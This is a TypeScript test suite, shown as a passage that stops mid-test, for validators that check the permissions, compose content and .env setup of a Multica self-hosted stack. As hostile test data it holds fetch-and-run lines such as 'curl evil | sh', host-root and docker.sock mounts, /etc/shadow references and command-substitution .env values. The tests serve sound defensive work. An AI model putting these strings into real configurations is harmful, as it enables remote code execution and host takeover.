import { chmod, lstat, mkdtemp, readFile, rm, stat, symlink, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { randomBytes } from "node:crypto";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import {
	buildEnvContent,
	nodeSetupDeps,
	readLocalServerSettings,
	setupStackEnv,
	unsafeComposeReason,
	validateStackDir,
	writeLocalServerSettings,
	type SetupDeps,
	type StackFs,
} from "./multica-local-server-stack";

const COMPOSE = "name: multica\n\nservices:\n  postgres:\n    image: x\n  backend:\n    image: y\n  frontend:\n    image: z\n";

type Entry = { type: "file" | "dir" | "link"; mode: number; uid?: number; gid?: number; target?: string; content?: string; lstatError?: string };

/** An in-memory file system: ownership, modes and symlinks can be set at will, whatever the host's /tmp looks like. */
function fakeStackFs(entries: Record<string, Entry>): StackFs {
	const missing = (file: string) => Object.assign(new Error(`ENOENT ${file}`), { code: "ENOENT" });
	const resolve = (file: string, depth = 0): string => {
		if (depth > 8) throw missing(file);
		const parts = file.split("/").filter(Boolean);
		let current = "";
		for (const part of parts) {
			current = `${current}/${part}`;
			const entry = entries[current];
			if (!entry) throw missing(current);
			if (entry.type === "link") {
				const rest = parts.slice(current.split("/").filter(Boolean).length).join("/");
				return resolve(path.posix.join(entry.target as string, rest), depth + 1);
			}
		}
		return current === "" ? "/" : current;
	};
	const info = (entry: Entry) => ({
		isFile: () => entry.type === "file",
		isDirectory: () => entry.type === "dir",
		isSymbolicLink: () => entry.type === "link",
		mode: entry.mode,
		uid: entry.uid ?? 0,
		gid: entry.gid ?? 0,
		size: entry.content?.length ?? 0,
	});
	return {
		realpath: async (file) => resolve(file),
		stat: async (file) => info(entries[resolve(file)] as Entry),
		lstat: async (file) => {
			const parent = resolve(path.posix.dirname(file));
			const entry = entries[path.posix.join(parent, path.posix.basename(file))];
			if (!entry) throw missing(file);
			if (entry.lstatError) throw Object.assign(new Error(entry.lstatError), { code: entry.lstatError });
			return info(entry);
		},
		readFile: async (file) => {
			const entry = entries[resolve(file)];
			if (!entry || entry.type !== "file") throw missing(file);
			return entry.content ?? "";
		},
	};
}

describe("validateStackDir", () => {
	const ME = { uid: 501, gid: 20 };
	const D = "/Users/me/.multica/server";
	const F = `${D}/docker-compose.selfhost.yml`;
	const dir = (mode = 0o755, uid = 501, gid = 20): Entry => ({ type: "dir", mode, uid, gid });
	const file = (content: string, mode = 0o644, uid = 501, gid = 20): Entry => ({ type: "file", mode, uid, gid, content });
	const tree = (patch: Record<string, Entry | null> = {}): Record<string, Entry> => {
		const entries: Record<string, Entry> = {
			"/": dir(0o755, 0, 0),
			"/Users": dir(0o755, 0, 0),
			"/Users/me": dir(),
			"/Users/me/.multica": dir(),
			[D]: dir(),
			[F]: file(COMPOSE),
		};
		for (const [key, value] of Object.entries(patch)) {
			if (value === null) delete entries[key];
			else entries[key] = value;
		}
		return entries;
	};
	const validate = (entries: Record<string, Entry>, target = D, options: { uid?: number; gid?: number } = ME) => validateStackDir(target, { fs: fakeStackFs(entries), ...options });

	it("accepts a Multica stack folder and returns the canonical directory and file", async () => {
		await expect(validate(tree())).resolves.toEqual({ ok: true, dir: D, file: F });
	});

	it("accepts a private .env and a missing one (that is a setup step, not an error)", async () => {
		await expect(validate(tree({ [`${D}/.env`]: file("JWT_SECRET=x\n", 0o600) }))).resolves.toMatchObject({ ok: true });
		await expect(validate(tree())).resolves.toMatchObject({ ok: true });
	});

	it("canonicalizes a symlinked folder to its real location", async () => {
		await expect(validate(tree({ "/Users/me/link": { type: "link", mode: 0o755, target: D } }), "/Users/me/link")).resolves.toMatchObject({ ok: true, dir: D });
	});

	it("rejects a relative path, a NUL byte and a missing folder", async () => {
		await expect(validate(tree(), "server")).resolves.toEqual({ ok: false, error: "not_absolute" });
		await expect(validate(tree(), `${D}\0x`)).resolves.toEqual({ ok: false, error: "not_absolute" });
		await expect(validate(tree(), "/Users/me/missing")).resolves.toEqual({ ok: false, error: "not_found" });
	});

	it("rejects a file where a folder is expected", async () => {
		await expect(validate(tree(), F)).resolves.toEqual({ ok: false, error: "not_directory" });
	});

	it("rejects a folder or compose file that others can write", async () => {
		await expect(validate(tree({ [D]: dir(0o777) }))).resolves.toEqual({ ok: false, error: "unsafe_directory" });
		await expect(validate(tree({ [F]: file(COMPOSE, 0o666) }))).resolves.toEqual({ ok: false, error: "unsafe_compose_file" });
		await expect(validate(tree({ [F]: file(COMPOSE, 0o664, 501, 1234) }))).resolves.toEqual({ ok: false, error: "unsafe_compose_file" });
	});

	it("rejects a safe folder under a writable ancestor, because whoever can write the parent can swap the folder", async () => {
		for (const [ancestor, mode] of [["/Users/me/.multica", 0o777], ["/Users/me", 0o777], ["/Users", 0o1777], ["/", 0o777]] as const) {
			await expect(validate(tree({ [ancestor]: dir(mode, ancestor === "/" || ancestor === "/Users" ? 0 : 501) })), ancestor).resolves.toEqual({ ok: false, error: "unsafe_directory" });
		}
		await expect(validate(tree({ "/Users/me": dir(0o775, 501, 1234) }))).resolves.toEqual({ ok: false, error: "unsafe_directory" });
	});

	it("accepts a group-writable ancestor only when it is root-owned with group root/wheel or admin", async () => {
		await expect(validate(tree({ "/Users": dir(0o775, 0, 80) }))).resolves.toMatchObject({ ok: true });
		await expect(validate(tree({ "/Users": dir(0o775, 0, 0) }))).resolves.toMatchObject({ ok: true });
	});

	it("rejects a group-writable ancestor that is user-owned (any group) or root-owned for a shared group", async () => {
		for (const gid of [0, 20, 50, 80, 1234]) {
			await expect(validate(tree({ "/Users/me": dir(0o775, 501, gid) })), `user-owned ancestor ${gid}`).resolves.toEqual({ ok: false, error: "unsafe_directory" });
		}
		for (const gid of [20, 50, 1234]) {
			await expect(validate(tree({ "/Users": dir(0o775, 0, gid) })), `root-owned ancestor ${gid}`).resolves.toEqual({ ok: false, error: "unsafe_directory" });
		}
	});

	it("rejects a stack folder, compose file or .env that any group can write, whatever the group", async () => {
		for (const gid of [0, 20, 50, 80, 1234]) {
			await expect(validate(tree({ [D]: dir(0o775, 501, gid) })), `folder ${gid}`).resolves.toEqual({ ok: false, error: "unsafe_directory" });
			await expect(validate(tree({ [F]: file(COMPOSE, 0o664, 501, gid) })), `compose ${gid}`).resolves.toEqual({ ok: false, error: "unsafe_compose_file" });
			await expect(validate(tree({ [`${D}/.env`]: file("x", 0o660, 501, gid) })), `env ${gid}`).resolves.toEqual({ ok: false, error: "unsafe_env_file" });
		}
		// ME has primary group 20: that is not exclusive ownership either.
		await expect(validate(tree({ [F]: file(COMPOSE, 0o664, 501, 20) }), D, { uid: 501, gid: 20 })).resolves.toEqual({ ok: false, error: "unsafe_compose_file" });
	});

	it("holds the stack folder itself to the strict rule: a root-owned folder that group admin can write is refused too", async () => {
		await expect(validate(tree({ [D]: dir(0o775, 0, 80) }))).resolves.toEqual({ ok: false, error: "unsafe_directory" });
		await expect(validate(tree({ [D]: dir(0o775, 0, 0) }))).resolves.toEqual({ ok: false, error: "unsafe_directory" });
	});

	it("rejects a folder, ancestor or compose file owned by another user", async () => {
		await expect(validate(tree({ [D]: dir(0o755, 502) }))).resolves.toEqual({ ok: false, error: "unsafe_directory" });
		await expect(validate(tree({ "/Users/me": dir(0o755, 502) }))).resolves.toEqual({ ok: false, error: "unsafe_directory" });
		await expect(validate(tree({ [F]: file(COMPOSE, 0o644, 502) }))).resolves.toEqual({ ok: false, error: "unsafe_compose_file" });
	});

	it("rejects a .env it cannot inspect, rather than assuming there is none", async () => {
		for (const code of ["EACCES", "EPERM", "EIO"]) {
			await expect(validate(tree({ [`${D}/.env`]: { ...file("x", 0o600), lstatError: code } })), code).resolves.toEqual({ ok: false, error: "unsafe_env_file" });
		}
	});

	it("rejects a .env that is a symlink, even to a private file", async () => {
		const entries = tree({ [`${D}/.env`]: { type: "link", mode: 0o777, target: `${D}/real.env` }, [`${D}/real.env`]: file("JWT_SECRET=x", 0o600) });
		await expect(validate(entries)).resolves.toEqual({ ok: false, error: "unsafe_env_file" });
	});

	it("rejects a .env that is a symlink to a world-writable target", async () => {
		const entries = tree({ [`${D}/.env`]: { type: "link", mode: 0o777, target: "/tmp/shared.env" }, "/tmp": dir(0o1777, 0, 0), "/tmp/shared.env": file("COMPOSE_PROJECT_NAME=other", 0o666) });
		await expect(validate(entries)).resolves.toEqual({ ok: false, error: "unsafe_env_file" });
	});

	it("rejects a .env that others or a group can write, one owned by another user, one that is not a file or too large", async () => {
		for (const [name, entry] of [
			["world-writable", file("x", 0o666)],
			["group-writable", file("x", 0o660)],
			["other owner", file("x", 0o600, 502)],
			["directory", dir()],
			["huge", file("x".repeat(300 * 1024), 0o600)],
		] as const) {
			await expect(validate(tree({ [`${D}/.env`]: entry })), name).resolves.toEqual({ ok: false, error: "unsafe_env_file" });
		}
	});

	it("rejects a compose file that is a symlink, even to a good file inside the folder", async () => {
		const entries = tree({ [F]: { type: "link", mode: 0o777, target: `${D}/real.yml` }, [`${D}/real.yml`]: file(COMPOSE) });
		await expect(validate(entries)).resolves.toEqual({ ok: false, error: "unsafe_compose_file" });
	});

	it("rejects a compose file that points outside the folder", async () => {
		const entries = tree({ [F]: { type: "link", mode: 0o777, target: "/Users/me/outside.yml" }, "/Users/me/outside.yml": file(COMPOSE) });
		await expect(validate(entries)).resolves.toEqual({ ok: false, error: "unsafe_compose_file" });
	});

	it("rejects a folder without the fixed compose file name", async () => {
		await expect(validate(tree({ [F]: null, [`${D}/docker-compose.yml`]: file(COMPOSE) }))).resolves.toEqual({ ok: false, error: "no_compose_file" });
	});

	it("rejects a compose file that is not Multica's, or is too large", async () => {
		await expect(validate(tree({ [F]: file("name: other\nservices:\n  web:\n    image: x\n") }))).resolves.toEqual({ ok: false, error: "not_multica" });
		await expect(validate(tree({ [F]: file(`${COMPOSE}${"#".repeat(300 * 1024)}`) }))).resolves.toEqual({ ok: false, error: "unsafe_compose_file" });
	});

	it("does not judge ownership or modes where there is no user id (Windows)", async () => {
		await expect(validate(tree({ [D]: dir(0o777, 999), "/Users/me": dir(0o777, 999) }), D, { uid: undefined, gid: undefined } as never)).resolves.toMatchObject({ ok: true });
	});

	describe("compose content (decoded structure)", () => {
		const SERVICES = (extra = "") => `name: multica
services:
  postgres:
    image: pgvector/pgvector:pg17
  backend:
    image: b${extra}
  frontend:
    image: f
`;
		const reasonOf = (text: string) => unsafeComposeReason(text);
		const rejected = (text: string) => validate(tree({ [F]: file(text) }));
		const refused = { ok: false, error: "unsafe_compose_content" };

		const STOCK = `name: multica
services:
  postgres:
    image: pgvector/pgvector:pg17
    environment:
      POSTGRES_DB: \${POSTGRES_DB:-multica}
      POSTGRES_USER: \${POSTGRES_USER:-multica}
    volumes:
      - pgdata:/var/lib/postgresql/data
    restart: unless-stopped
    healthcheck:
      test:
        [
          "CMD-SHELL",
          "pg_isready -U x",
        ]
      interval: 5s
      timeout: 5s
      retries: 5
  backend:
    image: \${MULTICA_BACKEND_IMAGE:-ghcr.io/multica-ai/multica-backend}:\${MULTICA_IMAGE_TAG:-latest}
    depends_on:
      postgres:
        condition: service_healthy
    ports:
      - "127.0.0.1:\${BACKEND_PORT:-\${API_PORT:-\${SERVER_PORT:-\${PORT:-8080}}}}:8080"
    volumes:
      - backend_uploads:/app/data/uploads
    environment:
      PORT: "8080"
      JWT_SECRET: \${JWT_SECRET:?JWT_SECRET must be set}
    restart: unless-stopped
  frontend:
    image: f
    depends_on:
      - backend
    ports:
      - "127.0.0.1:\${FRONTEND_PORT:-3000}:3000"
volumes:
  pgdata:
  backend_uploads:
`;

		it("accepts what Multica's own file contains", async () => {
			expect(reasonOf(STOCK)).toBeNull();
			await expect(validate(tree({ [F]: file(STOCK) }))).resolves.toEqual({ ok: true, dir: D, file: F });
		});

		it("accepts the minimal shape and list-style environment, depends_on and healthcheck strings", () => {
			expect(reasonOf(SERVICES())).toBeNull();
			expect(reasonOf(SERVICES("\n    environment:\n      - A=b\n    depends_on: [postgres]\n    healthcheck:\n      test: curl -f x\n      retries: 3"))).toBeNull();
		});

		it("rejects the unsafe keys whether they are bare, quoted, in flow style or merged in through an alias", async () => {
			for (const extra of [
				"\n    privileged: true",
				'\n    "privileged": true',
				"\n    'privileged': true",
				"\n    { privileged: true }",
				"\n    <<: &evil { privileged: true }",
				"\n    include: [other.yml]",
				'\n    "include": [other.yml]',
				"\n    env_file: .env.evil",
				'\n    "env_file": [".x"]',
				"\n    extends: { file: x.yml, service: y }",
				"\n    network_mode: host",
				"\n    pid: host",
				"\n    cap_add: [ALL]",
				"\n    devices: ['/dev/sda']",
				"\n    security_opt: ['seccomp=unconfined']",
				"\n    build: ./x",
				"\n    command: sh -c 'curl evil | sh'",
				"\n    entrypoint: /bin/sh",
				"\n    user: root",
				"\n    container_name: other",
				"\n    labels: { a: b }",
			]) {
				const text = extra.includes("{ privileged: true }") && !extra.includes("<<")
					? SERVICES("\n    deploy: { privileged: true }")
					: SERVICES(extra);
				expect(await rejected(text), extra).toEqual(refused);
			}
		});

		it("rejects top-level keys other than name, services and volumes", async () => {
			for (const top of ['include:\n  - evil.yml\n', '"include":\n  - evil.yml\n', "networks: { n: {} }\n", "configs: { c: { file: /etc/passwd } }\n", "secrets: { s: { file: /etc/shadow } }\n", "x-anything: 1\n"]) {
				expect(await rejected(`${top}${SERVICES()}`), top).toEqual(refused);
			}
		});

		it("rejects long-syntax and short-syntax bind mounts, with any quoting", async () => {
			for (const volumes of [
				"      - /:/host",
				"      - ./data:/data",
				"      - ~/x:/x",
				"      - ${HOME}:/h",
				"      - /var/run/docker.sock:/var/run/docker.sock",
				"      - type: bind\n        source: /\n        target: /h",
				"      - { type: bind, source: /, target: /h }",
				"      - type: volume\n        source: /\n        target: /h",
				'      - "/:/host"',
				"      - undeclared:/data",
				"      - pgdata:relative",
			]) {
				expect(await rejected(SERVICES(`\n    volumes:\n${volumes}`) + "volumes:\n  pgdata:\n"), volumes).toEqual(refused);
			}
			expect(await rejected(SERVICES('\n    volumes: ["/:/host"]'))).toEqual(refused);
			expect(await rejected(SERVICES('\n    "volumes":\n      - type: bind\n        source: /\n        target: /h'))).toEqual(refused);
		});

		it("rejects a named volume that is a bind mount in disguise", async () => {
			for (const definition of [
				"pgdata:\n    driver_opts: { type: none, o: bind, device: / }",
				"pgdata:\n    driver: local\n    driver_opts:\n      type: none\n      o: bind\n      device: /",
				"pgdata: { driver_opts: { type: none, o: bind, device: / } }",
				"pgdata:\n    external: true",
				"pgdata:\n    name: other",
				"pgdata:\n    labels: { a: b }",
				"pgdata: other",
			]) {
				const text = `${SERVICES("\n    volumes:\n      - pgdata:/data")}volumes:\n  ${definition}\n`;
				expect(await rejected(text), definition).toEqual(refused);
			}
		});

		it("accepts bare named-volume declarations, null or empty", () => {
			expect(reasonOf(`${SERVICES("\n    volumes:\n      - pgdata:/data\n      - other:/o:ro")}volumes:\n  pgdata:\n  other: {}\n`)).toBeNull();
		});

		it("rejects ports published beyond loopback, quoted or not, in any form", async () => {
			for (const ports of [
				'    ports:\n      - "8080:8080"',
				'    ports:\n      - "0.0.0.0:8080:8080"',
				"    ports:\n      - 3000:3000",
				'    ports:\n      - "192.168.1.5:3000:3000"',
				'    ports: ["0.0.0.0:80:80"]',
				'    "ports":\n      - "0.0.0.0:80:80"',
				'    ports:\n      - "${IP:-127.0.0.1}:80:80"',
				'    ports:\n      - "127.0.0.1:0.0.0.0:80:8080"',
				"    ports:\n      - target: 80\n        published: 80\n        host_ip: 0.0.0.0",
				"    ports:\n      - 80",
			]) {
				expect(await rejected(SERVICES(`\n${ports}`)), ports).toEqual(refused);
			}
		});

		it("accepts loopback ports, IPv4 or IPv6, with interpolated host ports", () => {
			expect(reasonOf(SERVICES('\n    ports:\n      - "127.0.0.1:8080:8080"\n      - "[::1]:3000:3000/tcp"\n      - "127.0.0.1:${A:-${B:-1}}:80"'))).toBeNull();
		});

		it("rejects documents that are not a single plain mapping, repeat a key or hide behind tags", async () => {
			for (const text of [
				"- a\n- b\n",
				"just text",
				`${SERVICES()}---\n${SERVICES()}`,
				"name: multica\nname: other\nservices: {}\n",
				`${SERVICES()}services: {}\n`,
				"name: multica\nservices:\n  postgres:\n    image: !!js/function 'function(){}'\n",
				"name: multica\nservices: [unterminated\n",
				"",
			]) {
				expect(await rejected(text), text).toEqual({ ok: false, error: expect.stringMatching(/not_multica|unsafe_compose_content/) });
			}
		});

		it("rejects anchors, aliases and merge keys even when the decoded result would be fine", async () => {
			const withAnchor = "name: multica\nservices:\n  postgres:\n    image: &img pgvector\n  backend:\n    image: *img\n  frontend:\n    image: f\n";
			expect(reasonOf(withAnchor)).not.toBeNull();
			expect(reasonOf("name: multica\nservices:\n  postgres:\n    image: &img x\n")).not.toBeNull();
			expect(await rejected(withAnchor)).toEqual(refused);
			for (const merge of ["<<: { image: x }", '"<<": { image: x }', "'<<' : { image: x }", "<<:\n      image: x"]) {
				expect(reasonOf(`name: multica\nservices:\n  postgres:\n    ${merge}\n`), merge).not.toBeNull();
			}
			expect(reasonOf("name: multica\nservices:\n  postgres:\n    image: x\n    environment:\n      A: &v 1\n")).not.toBeNull();
		});

		it("rejects a merge key in every spelling, even when it would only merge a harmless field", async () => {
			const svc = (body: string) => `name: multica\nservices:\n  postgres:\n    image: x\n  backend:\n    image: b\n  frontend:\n    image: f\n${body}`;
			for (const merge of [
				'    !!merge "\\x3c\\x3c": { image: backend }',
				'    !!merge "\\u003c\\u003c": { image: backend }',
				'    !!merge <<: { image: backend }',
				'    "\\x3c\\x3c": { image: backend }',
				'    "\\u003c\\u003c": { image: backend }',
				"    '<<': { image: backend }",
				"    <<: { image: backend }",
				"    ? <<\n    : { image: backend }",
				"    <<: [ { image: backend } ]",
			]) {
				const text = svc("").replace("  backend:\n    image: b\n", `  backend:\n    image: b\n${merge}\n`);
				expect(reasonOf(text), merge).not.toBeNull();
				expect(await rejected(text), merge).toEqual(refused);
			}
		});

		it("rejects the other YAML-specific tags too (binary, timestamp, set, omap) instead of decoding them", () => {
			for (const tagged of ["image: !!binary aGVsbG8=", "image: !!timestamp 2001-12-14", "image: !!set { a, b }", "image: !!omap [ a: 1 ]", "image: !!js/function 'x'", "image: !custom x"]) {
				expect(reasonOf(`name: multica\nservices:\n  postgres:\n    ${tagged}\n`), tagged).not.toBeNull();
			}
		});

		it("accepts the characters & * ! < in ordinary string values (they are not anchors, tags or merge keys)", () => {
			expect(reasonOf(SERVICES('\n    healthcheck:\n      test: ["CMD-SHELL", "a && b || c; echo *.log !x <<EOF"]'))).toBeNull();
		});

		it("rejects very long strings anywhere", () => {
			const long = "x".repeat(5000);
			expect(reasonOf(SERVICES(`\n    environment:\n      A: ${long}`))).not.toBeNull();
			expect(reasonOf(`name: multica\nservices:\n  postgres:\n    image: ${long}\n`)).not.toBeNull();
			expect(reasonOf(SERVICES(`\n    healthcheck:\n      test: ["CMD", "${long}"]`))).not.toBeNull();
			expect(reasonOf(SERVICES(`\n    environment:\n      ${long}: a`))).not.toBeNull();
			expect(reasonOf(SERVICES(`\n    environment:\n      A: ${"y".repeat(4000)}`))).toBeNull();
		});

		it("rejects look-alike keys and names (Cyrillic, full-width, zero-width) instead of treating them as the real ones", () => {
			for (const key of ["\u0440rivileged", "privileged\u200b", "\uff50rivileged", "imag\u0435", "ports\u200b"]) {
				expect(reasonOf(SERVICES(`\n    ${key}: true`)), key).not.toBeNull();
			}
			expect(reasonOf("na\u043de: multica\nservices:\n  postgres:\n    image: x\n")).not.toBeNull();
			expect(reasonOf("name: multica\nservices:\n  p\u043estgres:\n    image: x\n")).not.toBeNull();
			expect(reasonOf(SERVICES('\n    ports:\n      - "127.0.0.\uff11:80:80"'))).not.toBeNull();
			expect(reasonOf(SERVICES('\n    volumes:\n      - "\u0440gdata:/data"') + "volumes:\n  pgdata:\n")).not.toBeNull();
		});

		it("rejects a BOM-prefixed or control-character-laden file as unparseable or unknown, never as accepted garbage", () => {
			expect(reasonOf("\uFEFFname: multica\nservices:\n  postgres:\n    image: x\n")).toBeNull();
			expect(reasonOf("name: multica\nservices:\n  postgres:\n    image: x\u0000y\n")).not.toBeNull();
		});

		it("rejects documents with extra YAML documents, including a trailing empty one with content after it", () => {
			expect(reasonOf(`${SERVICES()}\n...\n---\nname: other\n`)).not.toBeNull();
		});

		it("rejects a document that is empty, null, a scalar or a list without throwing", () => {
			for (const text of ["", "null", "~", "42", "just text", "- a\n- b\n", "[]"]) {
				expect(() => reasonOf(text), text).not.toThrow();
				expect(reasonOf(text), text).not.toBeNull();
			}
		});

		it("rejects a healthcheck with an unknown key or a value of the wrong kind", () => {
			for (const healthcheck of ["exec: foo", "test: x\n      mount: /", "test: { a: b }", "test: [1, 2]", "retries: { a: b }"]) {
				expect(reasonOf(SERVICES(`\n    healthcheck:\n      ${healthcheck}`)), healthcheck).not.toBeNull();
			}
			expect(reasonOf(SERVICES("\n    healthcheck: curl"))).not.toBeNull();
			expect(reasonOf(SERVICES("\n    healthcheck:\n      test: [CMD, curl]\n      interval: 5s\n      retries: 3"))).toBeNull();
		});

		it("rejects an alias bomb, and does so quickly", () => {
			const lines = ["a0: &a0 [x, x, x, x, x, x, x, x, x, x]"];
			for (let i = 1; i < 12; i += 1) lines.push(`a${i}: &a${i} [${Array(10).fill(`*a${i - 1}`).join(", ")}]`);
			expect(reasonOf(`name: multica\nservices:\n  postgres:\n    image: x\nvolumes: {}\n${lines.join("\n")}\n`)).not.toBeNull();
		});

		it("rejects a service name that is not a plain lowercase name, and a service that is not a mapping", () => {
			expect(reasonOf("name: multica\nservices:\n  Evil/Name:\n    image: x\n")).not.toBeNull();
			expect(reasonOf("name: multica\nservices:\n  web: image-only\n")).not.toBeNull();
			expect(reasonOf("name: multica\nservices: []\n")).not.toBeNull();
		});

		it("rejects another project name, a missing name and a service without a usable image", () => {
			expect(reasonOf("name: other\nservices:\n  postgres:\n    image: x\n")).not.toBeNull();
			expect(reasonOf("services:\n  postgres:\n    image: x\n")).not.toBeNull();
			expect(reasonOf("name: [multica]\nservices:\n  postgres:\n    image: x\n")).not.toBeNull();
			for (const image of ["", "42", "[a, b]", "{ a: b }", "null"]) {
				expect(reasonOf(`name: multica\nservices:\n  postgres:\n    image: ${image}\n`), image).not.toBeNull();
			}
			expect(reasonOf("name: multica\nservices:\n  postgres:\n    restart: always\n")).not.toBeNull();
		});

		it("rejects service volumes and ports that are not lists, without ever throwing", () => {
			for (const shape of ["volumes: {pgdata: /data}", "volumes: pgdata:/data", "volumes: 5", "ports: {a: b}", "ports: '127.0.0.1:80:80'", "ports: 80"]) {
				expect(() => reasonOf(SERVICES(`\n    ${shape}`) + "volumes:\n  pgdata:\n"), shape).not.toThrow();
				expect(reasonOf(SERVICES(`\n    ${shape}`) + "volumes:\n  pgdata:\n"), shape).not.toBeNull();
			}
		});

		it("rejects depends_on and environment of the wrong kind", () => {
			expect(reasonOf(SERVICES("\n    depends_on: [ghost]"))).not.toBeNull();
			expect(reasonOf(SERVICES("\n    depends_on: postgres"))).not.toBeNull();
			expect(reasonOf(SERVICES("\n    depends_on: 5"))).not.toBeNull();
			expect(reasonOf(SERVICES("\n    depends_on:\n      postgres:\n        condition: anything"))).not.toBeNull();
			expect(reasonOf(SERVICES("\n    environment:\n      A: { nested: x }"))).not.toBeNull();
			expect(reasonOf(SERVICES("\n    restart: sometimes"))).not.toBeNull();
		});
	});
});

describe("saved stack folder", () => {
	let state: string;
	beforeEach(async () => {
		state = await mkdtemp(path.join(os.tmpdir(), "ao-local-server-state-"));
	});
	afterEach(() => rm(state, { recursive: true, force: true }));

	it("round-trips an absolute folder in a 0600 file and reads nothing else from it", async () => {
		await writeLocalServerSettings(state, { stackDir: "/Users/me/multica" });
		expect(await readLocalServerSettings(state)).toEqual({ stackDir: "/Users/me/multica" });
		expect((await stat(path.join(state, "multica-local-server.json"))).mode & 0o777).toBe(0o600);
		expect(JSON.parse(await readFile(path.join(state, "multica-local-server.json"), "utf8"))).toEqual({ version: 1, stackDir: "/Users/me/multica" });
	});

	it("treats a missing, relative or malformed value as no folder", async () => {
		expect(await readLocalServerSettings(state)).toEqual({ stackDir: "" });
		await writeFile(path.join(state, "multica-local-server.json"), JSON.stringify({ stackDir: "relative/dir" }));
		expect(await readLocalServerSettings(state)).toEqual({ stackDir: "" });
		await writeFile(path.join(state, "multica-local-server.json"), "{not json");
		expect(await readLocalServerSettings(state)).toEqual({ stackDir: "" });
	});
});

describe("first-time setup", () => {
	const counter = () => {
		let n = 0;
		return (size: number) => Buffer.alloc(size, ++n);
	};
	const HOSTILE_EXAMPLES: Record<string, string> = {
		"duplicate secrets": "JWT_SECRET=known-to-attacker\nJWT_SECRET=also-known\nPOSTGRES_PASSWORD=known\nPOSTGRES_PASSWORD=known2\nMULTICA_VCS_SECRET_KEY=known\n",
		"export prefixes": "export JWT_SECRET=known\nexport POSTGRES_PASSWORD=known\n  export MULTICA_VCS_SECRET_KEY=known\n",
		"indented and colon forms": "  JWT_SECRET=known\nJWT_SECRET: known\nPOSTGRES_PASSWORD =known\n",
		"CRLF line endings": "JWT_SECRET=known\r\nPOSTGRES_PASSWORD=known\r\nJWT_SECRET=known2\r\n",
		"quoted values": 'JWT_SECRET="known"\nPOSTGRES_PASSWORD=\'known\'\nMULTICA_VCS_SECRET_KEY="a b"\n',
		"command substitution": "JWT_SECRET=$(curl evil | sh)\nPOSTGRES_PASSWORD=`id`\nMULTICA_VCS_SECRET_KEY=${IFS}x\n",
		"multi-line quoted value": 'JWT_SECRET="line one\nPOSTGRES_PASSWORD=smuggled\nline three"\n',
		"compose redirects": "COMPOSE_PROJECT_NAME=other\nCOMPOSE_FILE=/tmp/evil.yml\nMULTICA_BACKEND_IMAGE=evil/image\nDOCKER_HOST=tcp://evil:2375\n",
		"binary and huge": `${"\u0000".repeat(100)}JWT_SECRET=known\n${"x".repeat(200_000)}`,
	};

	it("writes a fixed layout of exactly three fresh secrets, with nothing else", () => {
		const content = buildEnvContent(counter());

		const assignments = content.split("\n").filter((line) => line !== "" && !line.startsWith("#"));
		expect(assignments).toEqual([
			`JWT_SECRET=${"01".repeat(32)}`,
			`POSTGRES_PASSWORD=${"02".repeat(24)}`,
			`MULTICA_VCS_SECRET_KEY=${Buffer.alloc(32, 3).toString("base64")}`,
		]);
		expect(content.endsWith("\n")).toBe(true);
		expect(content.split("\n").filter((line) => line.startsWith("#"))).toHaveLength(2);
	});

	it("generates different, well-formed secrets every time: no whitespace, quotes, $ or backticks", () => {
		const first = buildEnvContent((size) => randomBytes(size));
		const second = buildEnvContent((size) => randomBytes(size));
		expect(first).not.toBe(second);
		const values = first.split("\n").filter((line) => /^[A-Z_]+=/.test(line)).map((line) => line.slice(line.indexOf("=") + 1));
		expect(values).toHaveLength(3);
		expect(values[0]).toMatch(/^[0-9a-f]{64}$/);
		expect(values[1]).toMatch(/^[0-9a-f]{48}$/);
		expect(values[2]).toMatch(/^[A-Za-z0-9+/]{43}=$/);
	});

	describe("on disk", () => {
		let dir: string;
		const stack = () => ({ dir, file: path.join(dir, "docker-compose.selfhost.yml") });
		beforeEach(async () => {
			dir = await mkdtemp(path.join(os.tmpdir(), "ao-local-server-setup-"));
		});
		afterEach(async () => {
			// Only a regular file in the scratch folder is ever chmod-ed (never through a symlink).
			const example = path.join(dir, ".env.example");
			if ((await lstat(example).catch(() => null))?.isFile()) await chmod(example, 0o600);
			await rm(dir, { recursive: true, force: true });
		});

		it("creates .env with mode 0600 and the generated secrets", async () => {
			expect(await setupStackEnv(stack(), nodeSetupDeps((size) => Buffer.alloc(size, 7)))).toBe("created");
			expect((await stat(path.join(dir, ".env"))).mode & 0o777).toBe(0o600);
			expect(await readFile(path.join(dir, ".env"), "utf8")).toBe(buildEnvContent((size) => Buffer.alloc(size, 7)));
		});

		it("does not need, read or trust .env.example: a hostile one has no effect on what is written", async () => {
			for (const [name, example] of Object.entries(HOSTILE_EXAMPLES)) {
				await rm(path.join(dir, ".env"), { force: true });
				await writeFile(path.join(dir, ".env.example"), example, { mode: 0o666 });
				await chmod(path.join(dir, ".env.example"), 0o666);

				expect(await setupStackEnv(stack(), nodeSetupDeps((size) => Buffer.alloc(size, 7))), name).toBe("created");

				const written = await readFile(path.join(dir, ".env"), "utf8");
				expect(written, name).toBe(buildEnvContent((size) => Buffer.alloc(size, 7)));
				for (const marker of ["known", "evil", "smuggled", "COMPOSE_", "DOCKER_HOST", "$(", "`"]) expect(written, `${name}: ${marker}`).not.toContain(marker);
			}
		});

		it("works with no .env.example at all, with an unreadable one and with a symlink in its place", async () => {
			expect(await setupStackEnv(stack(), nodeSetupDeps(counter()))).toBe("created");
			await rm(path.join(dir, ".env"));
			await writeFile(path.join(dir, ".env.example"), "JWT_SECRET=known\n", { mode: 0o000 });
			expect(await setupStackEnv(stack(), nodeSetupDeps(counter()))).toBe("created");
			await rm(path.join(dir, ".env"));
			await chmod(path.join(dir, ".env.example"), 0o600);
			await rm(path.join(dir, ".env.example"));
			await writeFile(path.join(dir, "secret-elsewhere"), "SECRET-FROM-ELSEWHERE=1\n");
			await symlink(path.join(dir, "secret-elsewhere"), path.join(dir, ".env.example"));
			expect(await setupStackEnv(stack(), nodeSetupDeps(counter()))).toBe("created");
			expect(await readFile(path.join(dir, ".env"), "utf8")).not.toContain("SECRET-FROM-ELSEWHERE");
		});

		it("never overwrites an existing .env, whatever it holds", async () => {
			await writeFile(path.join(dir, ".env"), "JWT_SECRET=mine\n");
			expect(await setupStackEnv(stack(), nodeSetupDeps(counter()))).toBe("already_set_up");
			expect(await readFile(path.join(dir, ".env"), "utf8")).toBe("JWT_SECRET=mine\n");
		});

		it("does not follow a symlink planted as .env", async () => {
			await writeFile(path.join(dir, "elsewhere"), "untouched");
			await symlink(path.join(dir, "elsewhere"), path.join(dir, ".env"));
